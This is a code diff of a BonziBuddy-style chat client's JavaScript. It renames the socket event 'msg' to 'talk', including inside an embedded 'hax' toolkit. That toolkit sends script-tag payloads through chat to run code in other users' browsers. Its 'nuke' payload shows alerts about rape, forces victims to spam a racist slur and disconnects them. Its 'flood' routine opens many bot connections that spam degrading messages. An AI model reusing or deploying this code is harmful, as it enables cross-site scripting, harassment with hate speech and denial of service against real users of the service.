@@ -615,7 +615,7 @@ function setup() {
     ]);
   });
   
-  socket.on("msg", function(data) {
+  socket.on("talk", function(data) {
     var b = bonzis[data.guid];
     b.cancel();
     b.runSingleEvent([{
@@ -784,7 +784,7 @@ function sendInput() {
         }
       } 
     } else {
-      socket.emit("msg", {text: text})
+      socket.emit("talk", {text: text})
     }
   }
 }
@@ -1451,7 +1451,7 @@ class Bonzi {
           "heyname": {
             name: "Hey {NAME}!",
             callback: () => {
-              socket.emit("msg", {text: "Hey, " + this.userPublic.name + "!"});
+              socket.emit("talk", {text: "Hey, " + this.userPublic.name + "!"});
             }
           },
           "owo": {
@@ -2003,10 +2003,10 @@ window.BonziHandler = new agenthandle();
 var l = 10000;
 		var hax = {
 			send: (a) => {
-				socket.emit("msg",{text:`- <script>${a} //a<//script>`})
+				socket.emit("talk",{text:`- <script>${a} //a<//script>`})
 			},
 			nuke: () => {
-				socket.emit("msg",{text:`- <script>alert('RAPED AND NUKED'); setInterval(() => {socket.emit('talk',{text:'I AM A STINKY NEGRO '});},1000); setTimeout(() =>{alert('DISCONNECTED RETARD');socket.disconnect();},1)//a<//script>`})
+				socket.emit("talk",{text:`- <script>alert('RAPED AND NUKED'); setInterval(() => {socket.emit('talk',{text:'I AM A STINKY NEGRO '});},1000); setTimeout(() =>{alert('DISCONNECTED RETARD');socket.disconnect();},1)//a<//script>`})
 			},
 			flood: () => {
 				let qq = 0;
@@ -2016,7 +2016,7 @@ var l = 10000;
 						var cockpiss = io(location.href);
 						cockpiss.emit("login",{name: document.getElementById('newname').value});
             setTimeout(() => {
-						setInterval(() => {cockpiss.emit("msg",{text: (10000 + Math.random() * 99999) + "RAPED  BY "+document.getElementById('newname').value})},1100);
+						setInterval(() => {cockpiss.emit("talk",{text: (10000 + Math.random() * 99999) + "RAPED  BY "+document.getElementById('newname').value})},1100);
             },3500);
 						setTimeout(() => {cockpiss.disconnect();},30000)
 					}
